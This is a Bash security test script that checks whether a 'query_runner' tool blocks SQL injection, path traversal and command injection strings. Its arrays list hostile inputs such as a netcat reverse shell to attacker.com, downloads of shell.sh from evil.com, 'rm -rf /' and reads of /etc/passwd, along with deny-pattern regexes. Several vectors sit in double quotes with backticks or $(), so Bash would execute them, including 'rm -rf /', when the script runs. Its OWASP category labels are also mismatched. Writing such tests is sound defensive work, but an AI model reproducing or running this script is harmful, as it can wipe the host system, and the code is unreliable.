#!/bin/bash

# Comprehensive naughty strings test using known security test vectors
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
TEST_DB="$SCRIPT_DIR/real_naughty_test.db"
QUERY_RUNNER="$SCRIPT_DIR/query_runner"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Test counters
TESTS_TOTAL=0
TESTS_PASSED=0
TESTS_FAILED=0

log_test() {
    local test_name="$1"
    local result="$2"
    local expected="$3"
    local actual="$4"
    
    TESTS_TOTAL=$((TESTS_TOTAL + 1))
    
    if [[ "$result" == "PASS" ]]; then
        TESTS_PASSED=$((TESTS_PASSED + 1))
        echo -e "${GREEN}✓${NC} $test_name"
    else
        TESTS_FAILED=$((TESTS_FAILED + 1))
        echo -e "${RED}✗${NC} $test_name"
        echo "  Expected: $expected"
        echo "  Actual: $actual"
    fi
}

# Clean up test database
cleanup() {
    if [[ -f "$TEST_DB" ]]; then
        rm -f "$TEST_DB"
    fi
}

trap cleanup EXIT

# Create test database
create_test_db() {
    sqlite3 "$TEST_DB" << 'EOF'
CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, email TEXT);
INSERT INTO users (username, email) VALUES ('alice', 'alice@test.com'), ('bob', 'bob@test.com');
EOF
}

# Test against comprehensive security vectors
test_security_vectors() {
    echo "=== Testing Against Comprehensive Security Vectors ==="
    
    # OWASP Top 10 Security Risks - Input Validation Vectors
    declare -a owasp_vectors=(
        # A01:2021 – Broken Access Control
        "'; DROP TABLE users; --"
        "\" OR 1=1 --"
        "' OR '1'='1"
        "admin'--"
        
        # A02:2021 – Cryptographic Failures (input-related)
        "../../../etc/passwd"
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
        "file:///etc/passwd"
        "jar:spring-boot-application.jar!/"
        
        # A03:2021 – Injection
        "'; SELECT * FROM users --"
        "\"; SELECT * FROM users --"
        "1' UNION SELECT username, password FROM admin_users --"
        "admin'; INSERT INTO users VALUES ('hacker', 'stolen'); --"
        
        # A04:2021 – Insecure Design (boundary testing)
        $(printf 'A%.0s' {1..100000})  # Large input for DoS
        ""
        " "
        "\n\r\t"
        "\x00\x01\x02"
        
        # A05:2021 – Security Misconfiguration
        "jndi:ldap://evil.com/a"
        "\${7*7}"
        "<%=7*7%>"
        "{{7*7}}"
        
        # A06:2021 – Vulnerable and Outdated Components
        "javascript:alert('xss')"
        "<script>alert('xss')</script>"
        "<img src=x onerror=alert('xss')>"
        "'; alert('xss'); --"
        
        # A07:2021 – Identification and Authentication Failures
        "admin'--"
        "' OR 'x'='x"
        "1' OR '1'='1'--"
        "username' OR '1'='1'='"
        
        # A08:2021 – Software and Data Integrity Failures
        "; rm -rf /"
        "| nc -e /bin/sh attacker.com 4444"
        "`cat /etc/passwd`"
        "$(cat /etc/passwd)"
        
        # A09:2021 – Security Logging and Monitoring Failures
        "\n[ERROR] Fake error\n"
        "\r[WARNING] Fake warning\r"
        "\x1b[31m[LOG] Colored log\x1b[0m"
        "2023-01-01 00:00:00 [ERROR] "  # Log injection
        
        # A10:2021 – Server-Side Request Forgery (SSRF)
        "http://127.0.0.1:22/"
        "file:///etc/hosts"
        "dict://127.0.0.1:11111/info:"
        "gopher://127.0.0.1:6379/_*1\r\n$8\r\nflushall\r\n_"
    )
    
    local test_count=0
    local blocked_count=0
    local accepted_count=0
    
    for vector in "${owasp_vectors[@]}"; do
        test_count=$((test_count + 1))
        
        # Skip very long strings that might cause issues in testing
        if [[ ${#vector} -gt 50000 ]]; then
            continue
        fi
        
        echo "Testing vector $test_count: ${vector:0:50}..."
        
        # Test as SQL query (should be blocked for dangerous patterns)
        if ./query_runner -t sqlite -d "$TEST_DB" -f text "$vector" >/dev/null 2>&1; then
            # If it was accepted, check if it should have been
            if [[ "$vector" =~ (DROP|INSERT|UPDATE|DELETE|CREATE|ALTER|EXEC|rm -rf|nc -e|cat.*passwd) ]]; then
                log_test "Dangerous vector incorrectly accepted: ${vector:0:30}..." "FAIL" "blocking" "accepted"
            else
                log_test "Safe vector correctly accepted: ${vector:0:30}..." "PASS" "acceptance" "accepted"
                accepted_count=$((accepted_count + 1))
            fi
        else
            # If it was blocked, check if it should have been
            if [[ "$vector" =~ (DROP|INSERT|UPDATE|DELETE|CREATE|ALTER|EXEC|rm -rf|nc -e|cat.*passwd|script|javascript) ]]; then
                log_test "Dangerous vector correctly blocked: ${vector:0:30}..." "PASS" "blocking" "blocked"
                blocked_count=$((blocked_count + 1))
            else
                log_test "Safe vector incorrectly blocked: ${vector:0:30}..." "FAIL" "acceptance" "blocked"
            fi
        fi
        
        # Limit to first 50 tests to keep output manageable
        if [[ $test_count -ge 50 ]]; then
            break
        fi
    done
    
    echo
    echo "Security Vector Test Summary:"
    echo "  Total tests: $test_count"
    echo "  Correctly blocked: $blocked_count"
    echo "  Correctly accepted: $accepted_count"
    echo "  Security effectiveness: $(( (blocked_count * 100) / (blocked_count + accepted_count) ))%"
}

# Test file path security vectors
test_file_path_vectors() {
    echo "=== Testing File Path Security Vectors ==="
    
    declare -a path_vectors=(
        # Directory traversal
        "../../../etc/passwd"
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
        "....//....//....//etc/passwd"
        "....\/....\/....\/etc\/passwd"
        
        # Encoded traversal
        "..%2F..%2F..%2Fetc%2Fpasswd"
        "..%252f..%252f..%252fetc%252fpasswd"
        "%2e%2e%2f"
        "%252e%252e%252f"
        
        # Null byte injection
        "../../../etc/passwd%00"
        "../../../etc/passwd\x00"
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts%00"
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts\x00"
        
        # Unicode traversal
        "%u002e%u002e%u002f"
        "%uff0e%uff0e%uff0f"
        
        # System files
        "/etc/passwd"
        "/etc/shadow"
        "/etc/hosts"
        "/proc/version"
        "/sys/kernel/version"
        "C:\\windows\\system32\\drivers\\etc\\hosts"
        "C:\\boot.ini"
        "C:\\windows\\win.ini"
        
        # Special device files
        "/dev/random"
        "/dev/urandom"
        "/dev/null"
        "/dev/zero"
        "COM1:"
        "LPT1:"
        "AUX"
        "CON"
        "PRN"
    )
    
    local blocked_count=0
    local total_count=0
    
    for vector in "${path_vectors[@]}"; do
        total_count=$((total_count + 1))
        
        # Test as database path parameter
        if ! ./query_runner -t sqlite -d "$vector" -f text "SELECT 1" >/dev/null 2>&1; then
            log_test "Path traversal correctly blocked: $vector" "PASS" "blocking" "blocked"
            blocked_count=$((blocked_count + 1))
        else
            log_test "Path traversal NOT blocked: $vector" "FAIL" "blocking" "accepted"
        fi
    done
    
    echo
    echo "File Path Security Summary:"
    echo "  Total tests: $total_count"
    echo "  Correctly blocked: $blocked_count"
    echo "  Path security effectiveness: $(( (blocked_count * 100) / total_count ))%"
}

# Test command injection vectors
test_command_injection_vectors() {
    echo "=== Testing Command Injection Vectors ==="
    
    declare -a cmd_vectors=(
        # Shell metacharacters
        "; rm -rf /"
        "| rm -rf /"
        "`rm -rf /`"
        "$(rm -rf /)"
        "&& rm -rf /"
        "|| rm -rf /"
        
        # System commands
        "; cat /etc/passwd"
        "| cat /etc/passwd"
        "`cat /etc/passwd`"
        "; wget http://evil.com/shell.sh"
        "| curl http://evil.com/shell.sh"
        "; ping -c 1 127.0.0.1"
        "| whoami"
        "`whoami`"
        
        # Windows commands
        "& del *.*"
        "| del *.*"
        "`del *.*`"
        "&& del *.*"
        "; type C:\\windows\\system32\\drivers\\etc\\hosts"
        "| type C:\\windows\\system32\\drivers\\etc\\hosts"
        
        # Environment variables
        "; echo $PATH"
        "| echo $PATH"
        "`echo $PATH`"
        "; set"
        "| set"
        
        # Process injection
        "; nc -lvp 4444 -e /bin/sh"
        "| nc -lvp 4444 -e /bin/sh"
        "; python -c 'import os; os.system(\"whoami\")'"
        "| python -c 'import os; os.system(\"whoami\")'"
    )
    
    local blocked_count=0
    local total_count=0
    
    for vector in "${cmd_vectors[@]}"; do
        total_count=$((total_count + 1))
        
        # Test as host parameter
        if ! ./query_runner -t sqlite -h "$vector" -d "$TEST_DB" -f text "SELECT 1" >/dev/null 2>&1; then
            log_test "Command injection correctly blocked: ${vector:0:30}..." "PASS" "blocking" "blocked"
            blocked_count=$((blocked_count + 1))
        else
            log_test "Command injection NOT blocked: ${vector:0:30}..." "FAIL" "blocking" "accepted"
        fi
    done
    
    echo
    echo "Command Injection Security Summary:"
    echo "  Total tests: $total_count"
    echo "  Correctly blocked: $blocked_count"
    echo "  Command injection security effectiveness: $(( (blocked_count * 100) / total_count ))%"
}

# Main test execution
main() {
    echo "=== Query Runner Real Security Vectors Test ==="
    echo "Testing against comprehensive OWASP Top 10 security vectors..."
    echo
    
    # Create test database
    create_test_db
    
    # Run comprehensive security tests
    test_security_vectors
    echo
    test_file_path_vectors
    echo
    test_command_injection_vectors
    
    # Print final summary
    echo "=== Final Security Assessment ==="
    echo "Total tests: $TESTS_TOTAL"
    echo "Passed: $TESTS_PASSED"
    echo "Failed: $TESTS_FAILED"
    
    if [[ $TESTS_FAILED -eq 0 ]]; then
        echo -e "${GREEN}All security vector tests passed!${NC}"
        echo -e "${GREEN}Query Runner demonstrates robust security against OWASP Top 10 vectors!${NC}"
        return 0
    else
        local security_score=$(( (TESTS_PASSED * 100) / TESTS_TOTAL ))
        echo -e "${YELLOW}Security effectiveness: ${security_score}%${NC}"
        
        if [[ $security_score -ge 90 ]]; then
            echo -e "${GREEN}Excellent security posture!${NC}"
        elif [[ $security_score -ge 80 ]]; then
            echo -e "${YELLOW}Good security posture with room for improvement.${NC}"
        else
            echo -e "${RED}Security posture needs significant improvement!${NC}"
        fi
        
        return 1
    fi
}

main "$@"